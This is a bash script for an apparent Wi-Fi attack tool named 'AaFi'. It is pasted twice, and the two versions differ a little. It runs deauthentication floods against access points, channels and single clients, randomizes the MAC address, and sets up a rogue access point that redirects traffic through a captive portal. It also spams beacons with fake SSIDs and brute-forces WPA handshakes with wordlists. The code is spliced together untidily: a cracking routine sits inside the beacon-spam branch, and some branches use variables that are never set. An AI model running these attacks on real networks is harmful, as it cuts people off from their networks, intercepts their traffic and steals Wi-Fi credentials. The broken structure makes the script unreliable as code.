#!/bin/bash



### Colours YAY! ###
BK=$(tput setaf 0) # Black
GR=$(tput setaf 2) # Green
RD=$(tput setaf 1) # Red
YW=$(tput setaf 3) # Yellow
CY=$(tput setaf 6) # Cyan
WH=$(tput setaf 7) # White
NT=$(tput sgr0) # Netral
BD=$(tput bold) # Bold
BG=$(tput setab 4) # Background Color

# root check

function root_chk () {
	if [[ $EUID -ne 0 ]]; then
		echo "This script must be run as root"
		exit 1
	fi
}

##### Banner #####
function banner () {        

echo -e "    |             '||''''|  ||     '||    ||'                              ";
echo -e "   |||     ....    ||  .   ...      |||  |||    ....  .. ...   ... ...     ";
echo -e "  |  ||   '' .||   ||''|    ||      |'|..'||  .|...||  ||  ||   ||  ||     ";
echo -e " .''''|.  .|' ||   ||       ||      | '|' ||  ||       ||  ||   ||  ||     ";
echo -e ".|.  .||. '|..'|' .||.     .||.    .|. | .||.  '|...' .||. ||.  '|..'|.    ";
echo -e "                                                                           ";
echo -e "                                                                           "  
                                                  
}

function banner2 () {

echo "   _¦¦¦¦¦¦¦¦    _¦¦¦¦¦¦¦¦    _¦¦¦¦¦¦¦¦  _¦       ";
echo "  ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦ ¦¦¦       ";
echo "  ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦    ¦¯  ¦¦¦¦      ";
echo "  ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦  _¦¦¦___     ¦¦¦¦      ";
echo "¯¦¦¦¦¦¦¦¦¦¦¦ ¯¦¦¦¦¦¦¦¦¦¦¦ ¯¯¦¦¦¯¯¯     ¦¦¦¦      ";
echo "  ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦        ¦¦¦       ";
echo "  ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦        ¦¦¦       ";
echo "  ¦¦¦    ¦¯    ¦¦¦    ¦¯    ¦¦¦        ¦¯        ";
echo "                                                 ";
}

function get_interface () {
	printf "${BD}${RD}Interface List ${WH}\n"
	printf ""
	interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > .iface.tmp)
	con=1
	for x in $(cat .iface.tmp); do
		printf "${WH}%s) ${GR}%s\n" $con $x
		let con++

	done
	echo -ne "\n${BD}${RD}Aa${BD}${WH}fi${GR}@${WH}Terminal: ${WH}>> "; read iface
	selected_interface=$(sed ''$iface'q;d' .iface.tmp)
	IFS=$'\n'

}

function monitor_mode () {
	ifconfig $selected_interface down
	iwconfig $selected_interface mode monitor
	# Change MAC address
	macchanger -r $selected_interface
	ifconfig $selected_interface up
}

#deactivate monitor mode
function deactivate_monmode () {
	clear
	sleep 3
	ifconfig $selected_interface down
	macchanger -p $selected_interface
	iwconfig $selected_interface mode managed
	ifconfig $selected_interface up
	clear
	banner
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Deactivate Monitor Mode...\n"
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Goodbye... \n"
	rm -f .iface.tmp
	exit
}

function deactivate_2 () {
	clear
	sleep 3
	ifconfig $selected_interface down
	macchanger -p $selected_interface
	iwconfig $selected_interface mode managed
	ifconfig $selected_interface up
	nmcli device connect $selected_interface
	clear 
	banner
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Deactivate...\n"
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Goodbye...\n"
	rm -f .iface.tmp
	rm -f $rand_ssid"_list.txt"
	exit
}

### Menu ###
clear
root_chk
banner
printf " ${WH}1) ${GR}Deauth a Specific SSID\n"
printf " ${WH}2) ${GR}Deauth all Channels\n"
printf " ${WH}3) ${GR}Wireless Cracker\n"
printf " ${WH}4) ${GR}Rouge/Fake AP \n"
printf " ${WH}5) ${GR}AP Spam\n"
printf " ${WH}6) ${GR}Exit\n"
echo -ne "\n${BD}${RD}Aa${BD}${WH}fi${GR}@${WH}Terminal: ${WH}>> "; read attack
clear

if [[ $attack == 1 ]]; then
	banner
	printf "${NT}\n"
	nmcli dev wifi
	echo " "
	echo -ne "${BD}[+]${WH} Enter the target BSSID > "
	read bssid
	clear
	banner
	get_interface
	clear
	banner2
	printf "			${WH}[ ${GR}AaFi${WH}]\n"
	printf "		${WH}===== ${RD}Starting... ${WH}=====\n\n"
	monitor_mode >> /dev/null 2>&1
	trap deactivate_monmode EXIT ### CTRL+C to exit
	mdk3 $selected_interface d -t "$bssid"

elif [[ $attack == 2 ]]; then
	banner
	printf "${NT}\n"
	nmcli dev wifi
	echo " "
	echo -ne "${BD}[+]${WH} Enter the target Channel > "
	read CH
	clear
	banner
	get_interface
	clear
	banner2
	printf "			${WH}[ ${GR}AaFi${WH}]\n"
	printf "		${WH}===== ${RD}Starting... ${WH}=====\n\n"
	monitor_mode >> /dev/null 2>&1
	trap deactivate_monmode EXIT ### CTRL+C to exit
	mdk3 $selected_interface d -c $CH

elif [[ $attack == 3 ]]; then
	banner
	python /home/kali/AaFi/wifi.py
	
	printf "			${WH}[ ${GR}AaFi${WH}]\n"
		printf "		${WH}===== ${RD}Starting... ${WH}=====\n\n"
	trap deactivate_monmode EXIT ### CTRL+C to exit
	airodump-ng $selected_interface --bssid $bssid2 --channel $channel $1 &> /dev/null &
	aireplay-ng $selected_interface --deauth 0 -a $bssid2 -c $target $1

elif [[ $attack == 4 ]]; then
	banner2
	[ $# -eq 0 ] && { echo "usage: sudo AaFi.sh [wireless-device] [internet-device] [AP network name] (EX: sudo AaFi.sh wlan0 $2 POG "; exit 1; }
	wifi="$1"
	eth="$2"
	
	control_c()
{
  echo -e "\e[91mCTRL C Detected!\n"
  cleanup $wifi $eth
  echo -e "\e[91mExiting!"
  exit $?
}
function cleanup() {
	echo -en "\n###Caught SIGINT; Cleaning up and exiting\n"
	local x="$1" #x = wlan0
	local z="$2" #z = eth0
	echo -e "\e[32m###Restoring hostapd.conf"
	if [ -f /etc/hostapd/hostapd.BAK ]; then mv /etc/hostapd/hostapd.BAK /etc/hostapd/hostapd.conf; fi
	sleep 1
	echo -e "\e[32m###Restoring dnsmasq.conf"
	if [ -f /etc/dnsmasq.BAK ]; then mv /etc/dnsmasq.BAK /etc/dnsmasq.conf; fi
	sleep 1
	echo -e "\e[32m###Restoring iptables"
	iptables -t mangle -D PREROUTING -i $x -p udp --dport 53 -j RETURN
	iptables -t mangle -D PREROUTING -i $x -j captiveportal
	iptables -t mangle -D captiveportal -j MARK --set-mark 1
	iptables -t nat -D PREROUTING -i $x  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
	iptables -D FORWARD -i $x -j ACCEPT
	iptables -t nat -D POSTROUTING -o $z -j MASQUERADE
	iptables -t nat -F
	iptables -t nat -X
	iptables -t mangle -F
	iptables -t mangle -X
	sleep 1
	echo -e "\e[32m###Killing dnsmasq"
	pkill dnsmasq
	sleep 1
	echo -e "\e[32m###Killing hostapd"
	pkill hostapd
    exit $?
}
trap control_c SIGINT
echo -e "\e[32m###Backing up/Creating hostapd.conf"
if [ -f /etc/hostapd/hostapd.conf ]; then mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.BAK; fi
echo -e "interface=$1\ndriver=nl80211\nssid=$3\nhw_mode=g\nchannel=6\nignore_broadcast_ssid=0" > /etc/hostapd/hostapd.conf
sleep 1
echo -e "\e[32m###Backing up/Creating dnsmasq.conf"
if [ -f /etc/dnsmasq.conf ]; then mv /etc/dnsmasq.conf /etc/dnsmasq.BAK; fi
echo -e "no-resolv\ninterface=$1\ndhcp-range=10.0.0.2,10.0.0.101,12h\nserver=8.8.8.8\nserver=8.8.4.4" > /etc/dnsmasq.conf
sleep 1
echo -e "\e[32m###Adding routes to iptables"
iptables -t mangle -N captiveportal
iptables -t mangle -A PREROUTING -i $1 -p udp --dport 53 -j RETURN
iptables -t mangle -A PREROUTING -i $1 -j captiveportal
iptables -t mangle -A captiveportal -j MARK --set-mark 1
iptables -t nat -A PREROUTING -i $1  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
sysctl -w net.ipv4.ip_forward=1
iptables -A FORWARD -i $1 -j ACCEPT
iptables -t nat -A POSTROUTING -o $2 -j MASQUERADE
echo -e "\e[32m###Starting apache"
service apache2 start
echo -e "\e[32m###Configuring $1 "
ifconfig $1 up 10.0.0.1 netmask 255.255.255.0
echo -e "\e[32m###Turning on dnsmasq"
if [ -z "$(ps -e | grep dnsmasq)" ]
  then 
    dnsmasq &
  fi
sleep 1
echo -e "\e[32m###Starting hostapd"
hostapd -B /etc/hostapd/hostapd.conf 1> /dev/null
while true; do read x; done
	
elif [[ $attack == 5 ]]; then
	banner
	get_interface
	clear 
	banner
	printf "${WH}1) ${GR}Use default wordlist\n"
	printf "${WH}2) ${GR}Use custom wordlist\n"
	echo -ne "\n${BD}${RD}Aa${BD}${WH}fi${GR}@${WH}Terminal: ${WH}>> "; read spm
	if [[ $spm == 1 ]]; then
		nmcli device disconnect $selected_interface >> /dev/null 2>&1
		clear
		banner2
		trap deactivate_2 EXIT #### CTRL+C to exit
		sleep 2
		printf "			${WH}[ ${GR}AaFi${WH}]\n"
		printf "		${WH}===== ${RD}Starting... ${WH}=====\n\n"
		ifconfig $selected_interface down
		macchanger -r $selected_interface >> /dev/null 2>&1
		iwconfig $selected_interface mode monitor
		ifconfig $selected_interface up
		trap deactivate_2 EXIT ### CTRL+C to exit
		mdk3 $selected_interface b -f ssid_list.txt -a -s 1000
		
	
	
read_parameters() {
	bssid=$(cat .current_target.txt)
	output=$(cat .output.txt)
}

wordlists() {
	clear
	echo -e "[${yellow}*${default}] Available wordlists: \n"
	echo -e "[${yellow}0${default}] Custom.\n"
	echo -e "[${yellow}1${default}] WPA-Top62."
	echo -e "[${yellow}2${default}] WPA-Top447."
	echo -e "[${yellow}3${default}] WPA-Top4800."
	echo -ne "\n[${green}+${default}] Enter a wordlist to use in brute-forcing: "
	read wordlist_choice
	case "$wordlist_choice" in
		0)
			echo -ne "[${green}+${default}] Enter the path to wordlist: "
			read wordlist
			;;
		1)
			wordlist=Wordlists/WPA-Top62.txt
			;;
		2)
			wordlist=Wordlists/WPA-Top447.txt
			;;
		3)
			wordlist=Wordlists/WPA-Top4800.txt
			;;
	esac
}

aircrack() {
	echo -e "[${green}+${default}] Press Enter to start brute-forcing (when handshake is captured)."
	read
	cap_file="$output-01.cap"
	aircrack-ng -b $bssid -w $wordlist Output/$output/$cap_file
	restart
}

restart() {
        echo -e -n "\n[${green}*${default}] Operation completed. Press Enter to restart."
        read
	clear
        aircrack
}

        red='\033[0;31m'
        green='\033[0;32m'
        yellow='\033[0;33m'
        default='\033[0;39m'

read_parameters
wordlists
aircrack
	
	elif [[ $spm == 2 ]]; then
		con=1
		nmcli device disconnect $AD > /dev/null 2>&1
		clear
		banner
		printf "\n${BD}${RD}Aa${BD}${WH}fi${GR}@${WH}Terminal: ${WH}>> (SSID(Name of Network)) >> "; read rand_ssid;
		printf "\n${BD}${RD}Aa${BD}${WH}fi${GR}@${WH}Terminal: ${WH}>>(How Many SSIDs) >> "; read con_ssid;
		for x in $(seq 1 $con_ssid); do
			echo "$rand_ssid $x" >> $rand_ssid"_list.txt"

		done
		wait
		clear
		banner2
		trap deactivate_2 EXIT ### CTRL+C to exit
		sleep 2
		printf "			${WH}[ ${GR}AaFi${WH}]\n"
		printf "		${WH}===== ${RD}Starting... ${WH}=====\n\n"
		ifconfig $selected_interface down
		macchanger -r $selected_interface >> /dev/null 2>&1
		iwconfig $selected_interface mode monitor
		ifconfig $selected_interface up
		trap deactivate_2 EXIT
		mdk3 $selected_interface b -f $rand_ssid"_list.txt" -a -s 1000
	else
		printf " ${BD}${WH}[${RD}!${WH}] ${RD}Invalid Option ...\n"
		sleep 4
		trap deactivate_2 EXIT ### CTRL+C to exit
	fi
else
	printf " ${BD}${WH}[${RD}!${WH}] ${RD}Invalid Option ...\n"
	sleep 4
	trap deactivate_monmode EXIT ### CTRL+C to exit
fi
#!/bin/bash



### Colours YAY! ###
BK=$(tput setaf 0) # Black
GR=$(tput setaf 2) # Green
RD=$(tput setaf 1) # Red
YW=$(tput setaf 3) # Yellow
CY=$(tput setaf 6) # Cyan
WH=$(tput setaf 7) # White
NT=$(tput sgr0) # Netral
BD=$(tput bold) # Bold
BG=$(tput setab 4) # Background Color

# root check

function root_chk () {
	if [[ $EUID -ne 0 ]]; then
		echo "This script must be run as root"
		exit 1
	fi
}

##### Banner #####
function banner () {        

echo -e "    |             '||''''|  ||     '||    ||'                              ";
echo -e "   |||     ....    ||  .   ...      |||  |||    ....  .. ...   ... ...     ";
echo -e "  |  ||   '' .||   ||''|    ||      |'|..'||  .|...||  ||  ||   ||  ||     ";
echo -e " .''''|.  .|' ||   ||       ||      | '|' ||  ||       ||  ||   ||  ||     ";
echo -e ".|.  .||. '|..'|' .||.     .||.    .|. | .||.  '|...' .||. ||.  '|..'|.    ";
echo -e "                                                                           ";
echo -e "                                                                           "  
                                                  
}

function banner2 () {

echo "   _¦¦¦¦¦¦¦¦    _¦¦¦¦¦¦¦¦    _¦¦¦¦¦¦¦¦  _¦       ";
echo "  ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦ ¦¦¦       ";
echo "  ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦    ¦¯  ¦¦¦¦      ";
echo "  ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦  _¦¦¦___     ¦¦¦¦      ";
echo "¯¦¦¦¦¦¦¦¦¦¦¦ ¯¦¦¦¦¦¦¦¦¦¦¦ ¯¯¦¦¦¯¯¯     ¦¦¦¦      ";
echo "  ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦        ¦¦¦       ";
echo "  ¦¦¦    ¦¦¦   ¦¦¦    ¦¦¦   ¦¦¦        ¦¦¦       ";
echo "  ¦¦¦    ¦¯    ¦¦¦    ¦¯    ¦¦¦        ¦¯        ";
echo "                                                 ";
}

function get_interface () {
	printf "${BD}${RD}Interface List ${WH}\n"
	printf ""
	interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > .iface.tmp)
	con=1
	for x in $(cat .iface.tmp); do
		printf "${WH}%s) ${GR}%s\n" $con $x
		let con++

	done
	echo -ne "\n${BD}${RD}Aa${BD}${WH}fi${GR}@${WH}Terminal: ${WH}>> "; read iface
	selected_interface=$(sed ''$iface'q;d' .iface.tmp)
	IFS=$'\n'

}

function monitor_mode () {
	ifconfig $selected_interface down
	iwconfig $selected_interface mode monitor
	# Change MAC address
	macchanger -r $selected_interface
	ifconfig $selected_interface up
}

#deactivate monitor mode
function deactivate_monmode () {
	clear
	sleep 3
	ifconfig $selected_interface down
	macchanger -p $selected_interface
	iwconfig $selected_interface mode managed
	ifconfig $selected_interface up
	clear
	banner
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Deactivate Monitor Mode...\n"
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Goodbye... \n"
	rm -f .iface.tmp
	exit
}

function deactivate_2 () {
	clear
	sleep 3
	ifconfig $selected_interface down
	macchanger -p $selected_interface
	iwconfig $selected_interface mode managed
	ifconfig $selected_interface up
	nmcli device connect $selected_interface
	clear 
	banner
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Deactivate...\n"
	printf " ${BD}${WH}[${RD}*${WH}] ${RD}Goodbye...\n"
	rm -f .iface.tmp
	rm -f $rand_ssid"_list.txt"
	exit
}

### Menu ###
clear
root_chk
banner
printf " ${WH}1) ${GR}Deauth a Specific SSID\n"
printf " ${WH}2) ${GR}Deauth all Channels\n"
printf " ${WH}3) ${GR}Deauth a Specific Device on AP\n"
printf " ${WH}4) ${GR}Rouge/Fake AP \n"
printf " ${WH}5) ${GR}AP Spam\n"
printf " ${WH}6) ${GR}Exit\n"
echo -ne "\n${BD}${RD}Aa${BD}${WH}fi${GR}@${WH}Terminal: ${WH}>> "; read attack
clear

if [[ $attack == 1 ]]; then
	banner
	printf "${NT}\n"
	nmcli dev wifi
	echo " "
	echo -ne "${BD}[+]${WH} Enter the target BSSID > "
	read bssid
	clear
	banner
	get_interface
	clear
	banner2
	printf "			${WH}[ ${GR}AaFi${WH}]\n"
	printf "		${WH}===== ${RD}Starting... ${WH}=====\n\n"
	monitor_mode >> /dev/null 2>&1
	trap deactivate_monmode EXIT ### CTRL+C to exit
	mdk3 $selected_interface d -t "$bssid"

elif [[ $attack == 2 ]]; then
	banner
	printf "${NT}\n"
	nmcli dev wifi
	echo " "
	echo -ne "${BD}[+]${WH} Enter the target Channel > "
	read CH
	clear
	banner
	get_interface
	clear
	banner2
	printf "			${WH}[ ${GR}AaFi${WH}]\n"
	printf "		${WH}===== ${RD}Starting... ${WH}=====\n\n"
	monitor_mode >> /dev/null 2>&1
	trap deactivate_monmode EXIT ### CTRL+C to exit
	mdk3 $selected_interface d -c $CH

elif [[ $attack == 3 ]]; then
	banner
	monitor_mode >> /dev/null 2>&1
	nmcli dev wifi
	echo -ne "${BD}[+]${WH} Enter the BSSID of the target AP > "
	read bssid2
	echo -ne "${BD}[+]${WH} Enter the channel the AP is on > "
	read channel
	clear
	banner
	get_interface
	clear
	banner
	timeout --foreground -k 11 10 airodump-ng $selected_interface --bssid $bssid2 --channel $channel $1
	sleep 1
	banner
	echo -ne "${BD}[+]${WH} Enter the target MAC Address > "
	read target
	banner2
	printf "			${WH}[ ${GR}AaFi${WH}]\n"
		printf "		${WH}===== ${RD}Starting... ${WH}=====\n\n"
	trap deactivate_monmode EXIT ### CTRL+C to exit
	airodump-ng $selected_interface --bssid $bssid2 --channel $channel $1 &> /dev/null &
	aireplay-ng $selected_interface --deauth 0 -a $bssid2 -c $target $1

elif [[ $attack == 4 ]]; then
	banner2
	[ $# -eq 0 ] && { echo "usage: sudo AaFi.sh [wireless-device] [internet-device] [AP network name] (EX: sudo AaFi.sh wlan0 $2 POG "; exit 1; }
	wifi="$1"
	eth="$2"
	
	control_c()
{
  echo -e "\e[91mCTRL C Detected!\n"
  cleanup $wifi $eth
  echo -e "\e[91mExiting!"
  exit $?
}
function cleanup() {
	echo -en "\n###Caught SIGINT; Cleaning up and exiting\n"
	local x="$1" #x = wlan0
	local z="$2" #z = eth0
	echo -e "\e[32m###Restoring hostapd.conf"
	if [ -f /etc/hostapd/hostapd.BAK ]; then mv /etc/hostapd/hostapd.BAK /etc/hostapd/hostapd.conf; fi
	sleep 1
	echo -e "\e[32m###Restoring dnsmasq.conf"
	if [ -f /etc/dnsmasq.BAK ]; then mv /etc/dnsmasq.BAK /etc/dnsmasq.conf; fi
	sleep 1
	echo -e "\e[32m###Restoring iptables"
	iptables -t mangle -D PREROUTING -i $x -p udp --dport 53 -j RETURN
	iptables -t mangle -D PREROUTING -i $x -j captiveportal
	iptables -t mangle -D captiveportal -j MARK --set-mark 1
	iptables -t nat -D PREROUTING -i $x  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
	iptables -D FORWARD -i $x -j ACCEPT
	iptables -t nat -D POSTROUTING -o $z -j MASQUERADE
	iptables -t nat -F
	iptables -t nat -X
	iptables -t mangle -F
	iptables -t mangle -X
	sleep 1
	echo -e "\e[32m###Killing dnsmasq"
	pkill dnsmasq
	sleep 1
	echo -e "\e[32m###Killing hostapd"
	pkill hostapd
    exit $?
}
trap control_c SIGINT
echo -e "\e[32m###Backing up/Creating hostapd.conf"
if [ -f /etc/hostapd/hostapd.conf ]; then mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.BAK; fi
echo -e "interface=$1\ndriver=nl80211\nssid=$3\nhw_mode=g\nchannel=6\nignore_broadcast_ssid=0" > /etc/hostapd/hostapd.conf
sleep 1
echo -e "\e[32m###Backing up/Creating dnsmasq.conf"
if [ -f /etc/dnsmasq.conf ]; then mv /etc/dnsmasq.conf /etc/dnsmasq.BAK; fi
echo -e "no-resolv\ninterface=$1\ndhcp-range=10.0.0.2,10.0.0.101,12h\nserver=8.8.8.8\nserver=8.8.4.4" > /etc/dnsmasq.conf
sleep 1
echo -e "\e[32m###Adding routes to iptables"
iptables -t mangle -N captiveportal
iptables -t mangle -A PREROUTING -i $1 -p udp --dport 53 -j RETURN
iptables -t mangle -A PREROUTING -i $1 -j captiveportal
iptables -t mangle -A captiveportal -j MARK --set-mark 1
iptables -t nat -A PREROUTING -i $1  -p tcp -m mark --mark 1 -j DNAT --to-destination 10.0.0.1
sysctl -w net.ipv4.ip_forward=1
iptables -A FORWARD -i $1 -j ACCEPT
iptables -t nat -A POSTROUTING -o $2 -j MASQUERADE
echo -e "\e[32m###Starting apache"
service apache2 start
echo -e "\e[32m###Configuring $1 "
ifconfig $1 up 10.0.0.1 netmask 255.255.255.0
echo -e "\e[32m###Turning on dnsmasq"
if [ -z "$(ps -e | grep dnsmasq)" ]
  then 
    dnsmasq &
  fi
sleep 1
echo -e "\e[32m###Starting hostapd"
hostapd -B /etc/hostapd/hostapd.conf 1> /dev/null
while true; do read x; done
	
elif [[ $attack == 5 ]]; then
	banner
	get_interface
	clear 
	banner
	printf "${WH}1) ${GR}Use default wordlist\n"
	printf "${WH}2) ${GR}Use custom wordlist\n"
	echo -ne "\n${BD}${RD}Aa${BD}${WH}fi${GR}@${WH}Terminal: ${WH}>> "; read spm
	if [[ $spm == 1 ]]; then
		nmcli device disconnect $selected_interface >> /dev/null 2>&1
		clear
		banner2
		trap deactivate_2 EXIT #### CTRL+C to exit
		sleep 2
		printf "			${WH}[ ${GR}AaFi${WH}]\n"
		printf "		${WH}===== ${RD}Starting... ${WH}=====\n\n"
		ifconfig $selected_interface down
		macchanger -r $selected_interface >> /dev/null 2>&1
		iwconfig $selected_interface mode monitor
		ifconfig $selected_interface up
		trap deactivate_2 EXIT ### CTRL+C to exit
		mdk3 $selected_interface b -f ssid_list.txt -a -s 1000
		
	
	
read_parameters() {
	bssid=$(cat .current_target.txt)
	output=$(cat .output.txt)
}

wordlists() {
	clear
	echo -e "[${yellow}*${default}] Available wordlists: \n"
	echo -e "[${yellow}0${default}] Custom.\n"
	echo -e "[${yellow}1${default}] WPA-Top62."
	echo -e "[${yellow}2${default}] WPA-Top447."
	echo -e "[${yellow}3${default}] WPA-Top4800."
	echo -ne "\n[${green}+${default}] Enter a wordlist to use in brute-forcing: "
	read wordlist_choice
	case "$wordlist_choice" in
		0)
			echo -ne "[${green}+${default}] Enter the path to wordlist: "
			read wordlist
			;;
		1)
			wordlist=Wordlists/WPA-Top62.txt
			;;
		2)
			wordlist=Wordlists/WPA-Top447.txt
			;;
		3)
			wordlist=Wordlists/WPA-Top4800.txt
			;;
	esac
}

aircrack() {
	echo -e "[${green}+${default}] Press Enter to start brute-forcing (when handshake is captured)."
	read
	cap_file="$output-01.cap"
	aircrack-ng -b $bssid -w $wordlist Output/$output/$cap_file
	restart
}

restart() {
        echo -e -n "\n[${green}*${default}] Operation completed. Press Enter to restart."
        read
	clear
        aircrack
}

        red='\033[0;31m'
        green='\033[0;32m'
        yellow='\033[0;33m'
        default='\033[0;39m'

read_parameters
wordlists
aircrack
	
	elif [[ $spm == 2 ]]; then
		con=1
		nmcli device disconnect $AD > /dev/null 2>&1
		clear
		banner
		printf "\n${BD}${RD}Aa${BD}${WH}fi${GR}@${WH}Terminal: ${WH}>> (SSID(Name of Network)) >> "; read rand_ssid;
		printf "\n${BD}${RD}Aa${BD}${WH}fi${GR}@${WH}Terminal: ${WH}>>(How Many SSIDs) >> "; read con_ssid;
		for x in $(seq 1 $con_ssid); do
			echo "$rand_ssid $x" >> $rand_ssid"_list.txt"

		done
		wait
		clear
		banner2
		trap deactivate_2 EXIT ### CTRL+C to exit
		sleep 2
		printf "			${WH}[ ${GR}AaFi${WH}]\n"
		printf "		${WH}===== ${RD}Starting... ${WH}=====\n\n"
		ifconfig $selected_interface down
		macchanger -r $selected_interface >> /dev/null 2>&1
		iwconfig $selected_interface mode monitor
		ifconfig $selected_interface up
		trap deactivate_2 EXIT
		mdk3 $selected_interface b -f $rand_ssid"_list.txt" -a -s 1000
	else
		printf " ${BD}${WH}[${RD}!${WH}] ${RD}Invalid Option ...\n"
		sleep 4
		trap deactivate_2 EXIT ### CTRL+C to exit
	fi
else
	printf " ${BD}${WH}[${RD}!${WH}] ${RD}Invalid Option ...\n"
	sleep 4
	trap deactivate_monmode EXIT ### CTRL+C to exit
fi
